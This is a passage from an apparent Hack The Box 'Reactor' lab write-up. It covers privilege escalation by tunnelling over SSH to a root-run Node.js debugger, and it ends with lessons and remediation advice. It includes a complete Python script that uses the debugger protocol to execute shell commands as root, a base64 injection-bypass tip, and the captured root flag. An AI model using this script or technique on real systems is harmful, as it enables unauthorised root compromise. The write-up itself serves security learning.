node        1379 15.1  3.8 11813800 154112 ?     Ssl  Jun01  32:09 next-server (v15.0.3)
root        1387  0.0  1.2 1067348 48448 ?       Ssl  Jun01   0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
node        1486  0.0  0.0   2800  1680 ?        S    Jun01   0:00 /bin/sh
engineer    2419  0.0  0.0   6544  2280 pts/0    S+   00:01   0:00 grep --color=auto node
engineer@reactor:~$ 
```
<div align="center">
<br>
<br>
</div>

### 5.2 Process Analysis — Key Findings

The process list revealed two significant findings:

**Finding 1 — Next.js version confirmed**

```
node 1379 next-server (v15.0.3)
```

The process name directly exposes the Next.js version as **15.0.3** — information that eluded every fingerprinting technique attempted earlier. This retrospectively confirms the target was squarely within the CVE-2025-55182 affected range (15.0.0–15.0.4).

**Finding 2 — Node.js Inspector running as root**

```
root        1387  0.0  1.2 1067348 48448 ?       Ssl  Jun01   0:01 /usr/bin/node --inspect=127.0.0.1:9229 
```

This is the most critical finding. A Node.js process is running as **root** with the `--inspect` flag enabled, binding the Node.js debugger to `127.0.0.1:9229`. The Node.js inspector is a debugging interface that allows attaching a debugger and **executing arbitrary JavaScript** in the context of the running process — in this case, as root.

Because it is bound to `127.0.0.1`, it is not directly reachable from the attacker machine. However, as `engineer` with an SSH session already established, local port forwarding can tunnel the debugger port through SSH and expose it for exploitation.
<div align="center">
<br>
<br>
</div>

### 5.3 SSH Port Forwarding

With a root-owned Node.js process confirmed running with `--inspect=127.0.0.1:9229`, the debugger port was only accessible from within the target machine itself. SSH local port forwarding was used to tunnel the port through the existing engineer session, exposing it on the attacker machine.

**Command:** `ssh -L 9229:127.0.0.1:9229 engineer@TARGET_IP -N &`

**Breakdown:**

- `ssh`
    - **Description:** Secure Shell client
    - **Purpose:** Establishes the tunnel using the already-confirmed engineer credentials.
- `-L 9229:127.0.0.1:9229`
    - **Description:** Local port forwarding flag
    - **Purpose:** Instructs SSH to forward any traffic arriving at `localhost:9229` on the attacker machine through the SSH tunnel to `127.0.0.1:9229` on the target. From the target's perspective, the connection appears to originate locally — bypassing the loopback restriction entirely.
- `-N`
    - **Description:** No command flag
    - **Purpose:** Opens the tunnel without launching a shell on the target. The sole purpose of this SSH connection is port forwarding — no interactive session is needed.
- `&`
    - **Description:** Background execution operator
    - **Purpose:** Runs the tunnel in the background, freeing the terminal for subsequent commands.

**Result:** Tunnel established. The Node.js inspector at `127.0.0.1:9229` on the target is now reachable at `localhost:9229` on the attacker machine.

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ ssh -L 9229:127.0.0.1:9229 engineer@10.129.13.245 -N &
[1] 152372

┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ 
[1]  + suspended (tty output)  ssh -L 9229:127.0.0.1:9229 engineer@10.129.13.245 -N
```

> **Note:** The process suspended with `tty output` is expected behaviour when backgrounding an SSH process that attempts terminal interaction on Kali. The tunnel remains functional despite the suspension message.
<div align="center">
<br>
<br>
</div>

### 5.4 Node.js Inspector Exploitation — Root Code Execution

With the inspector port forwarded, a Python script was written to interact with the Node.js Chrome DevTools Protocol (CDP) directly. CDP is the debugging interface Node.js exposes via `--inspect` — it allows a connected client to evaluate arbitrary JavaScript expressions in the context of the running process, which in this case is running as root.

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ vi privesc.py

┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ cat privesc.py                                        
import json, websocket, urllib.request

# Get WebSocket URL
with urllib.request.urlopen('http://127.0.0.1:9229/json') as response:
    data = json.loads(response.read().decode())
    ws_url = data[0]['webSocketDebuggerUrl']

ws = websocket.create_connection(ws_url)

def send_and_wait(ws, msg_id, method, params=None):
    """Send CDP command, skip events, return response with matching ID."""
    ws.send(json.dumps({"id": msg_id, "method": method, "params": params or {}}))
    for _ in range(20):
        result = json.loads(ws.recv())
        if result.get('id') == msg_id:
            return result
    return None

msg_id = 1

# Enable Runtime execution context
send_and_wait(ws, msg_id, "Runtime.enable")
msg_id += 1

# Verify running as root
result = send_and_wait(ws, msg_id, "Runtime.evaluate", {
    "expression": "process.getuid()",
    "returnByValue": True
})
# Returns: {'result': {'type': 'number', 'value': 0}}  <- UID=0 (root)!
msg_id += 1

# Read root flag
result = send_and_wait(ws, msg_id, "Runtime.evaluate", {
    "expression": "process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()",
    "returnByValue": True
})
print(result['result']['result']['value'])
```

The script performed three operations in sequence:

**Step 1 — Discover the WebSocket URL**

```python
with urllib.request.urlopen('http://127.0.0.1:9229/json') as response:
    data = json.loads(response.read().decode())
    ws_url = data[0]['webSocketDebuggerUrl']
```

The Node.js inspector exposes a JSON endpoint at `/json` listing active debugging targets. Each target includes a `webSocketDebuggerUrl` — the WebSocket address used to send CDP commands. This URL is unique per process and session, so it must be fetched dynamically rather than hardcoded.

**Step 2 — Confirm root execution context**

```python
result = send_and_wait(ws, msg_id, "Runtime.evaluate", {
    "expression": "process.getuid()",
    "returnByValue": True
})
# Returns: {'type': 'number', 'value': 0}  ← UID 0 = root
```

`process.getuid()` returns the OS user ID of the running process. A return value of `0` confirms the process is executing as root — validating that any code evaluated through the inspector also runs with root privileges.

**Step 3 — Read the root flag**

```python
result = send_and_wait(ws, msg_id, "Runtime.evaluate", {
    "expression": "process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()",
    "returnByValue": True
})
print(result['result']['result']['value'])
```

`process.mainModule.require('child_process').execSync()` — the same Node.js primitive used throughout the CVE-2025-55182 exploitation chain — executes a shell command in the context of the root process. `cat /root/root.txt` reads the root flag directly, with the output returned through the CDP WebSocket response.

**Result:**

```
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ python3 privesc.py                                     
fab4252120bf323ccadc3b9be935bfa0
```

**ROOT FLAG:** `fab4252120bf323ccadc3b9be935bfa0`
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Conclusion & Remediation

1. **Next.js Server Actions are a hidden attack surface.** Even with no visible forms or input fields, the App Router can expose server-side deserialization endpoints accessible via `POST` + `Next-Action` header. Fuzzing for these is important on Next.js targets.

2. **React Flight deserialization is powerful.** The prototype pollution chain in the React Flight codec is a sophisticated exploit that bypasses traditional input sanitization because it exploits the serialization/deserialization process itself, not user-input parsing.

3. **Credentials in flat-file/embedded databases.** The SQLite database stored alongside the application code with MD5-hashed passwords is a common misconfiguration in Node.js web applications. MD5 is broken and should never be used for password hashing.

4. **Node.js `--inspect` on production systems is dangerous.** Even when bound to `127.0.0.1`, any local user (or attacker with SSRF/shell access) can connect to the CDP endpoint and execute arbitrary code with the privileges of the Node.js process. This is a privilege escalation path that is often overlooked.

5. **SSH port forwarding is a versatile pivoting tool.** When a service is bound to loopback, SSH local port forwarding (`-L`) is a clean way to expose it to your attack machine without writing files to the target or needing additional tools installed.

6. **Base64 encoding for command injection.** When shell commands contain single quotes or special characters that conflict with the injection context, encoding the command as base64 and decoding it at runtime (`Buffer.from(b64, 'base64').toString()`) is a reliable bypass technique.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 7. Remediation Recommendations

### 7.1 Update Next.js / React to Patched Version

The React Flight deserialization vulnerability should be addressed by upgrading to a Next.js version that patches the prototype pollution issue in the `react-server-dom-webpack` decoder.

**Action:** Update Next.js and React Server Components to the latest patched versions. Monitor CVE databases for Next.js security advisories.

### 7.2 Use Strong Password Hashing

MD5 is a fast hashing algorithm designed for data integrity, not password storage. It is trivially crackable even with modest hardware.

**Action:** Replace MD5 with bcrypt (cost factor ≥ 12), Argon2id, or scrypt for all stored passwords.

### 7.3 Disable Node.js Debugger in Production

Running a Node.js process with `--inspect` in a production environment is a critical security misconfiguration, especially when running as root.

**Action:** Remove `--inspect=127.0.0.1:9229` from the uptime monitor service startup command. If remote debugging is required for diagnostics, implement strong authentication and restrict access to trusted admin IPs via firewall rules.

### 7.4 Run Services with Least Privilege

The uptime monitor process (`/opt/uptime-monitor/worker.js`) runs as root but only needs to make HTTP requests and write to a log file.

**Action:** Create a dedicated service account (e.g., `uptime-monitor`) with only the necessary file permissions. Update the systemd service unit to use `User=uptime-monitor`.

### 7.5 Restrict File Permissions on Application Directory

The SQLite database `/opt/reactor-app/reactor.db` should not be readable by the service user running the web application if it contains sensitive credentials.

**Action:** Separate credential storage from the application directory. Use environment variables or a secrets manager for sensitive configuration. Ensure database files are readable only by the processes that require them.

### 7.6 Implement Security Headers

The application lacks security headers like `Content-Security-Policy` and `X-Frame-Options`.

**Action:** Configure appropriate security headers in the Next.js configuration (`next.config.js`) or via a reverse proxy.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## References
